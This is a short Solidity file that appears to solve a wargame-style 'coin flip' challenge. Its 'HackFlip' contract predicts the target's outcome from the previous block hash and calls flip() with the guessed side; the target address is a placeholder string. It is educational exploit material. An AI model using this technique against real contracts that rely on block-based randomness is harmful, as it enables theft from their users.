//Requirement:
    //guess the correct outcome 10 times in a row.
//Solution:
    //I wrote a the contract below to interact and hack the original coin flip contract 

pragma solidity ^0.6.0;

contract CoinFlip {
    function flip(bool _guess) public returns (bool);
}

contract HackFlip {
    CoinFlip public instance = CoinFlip("instanceAddress");
      uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
      uint256 lastHash;
    constructor() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
    
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
    
        instance.flip(side);
    }
}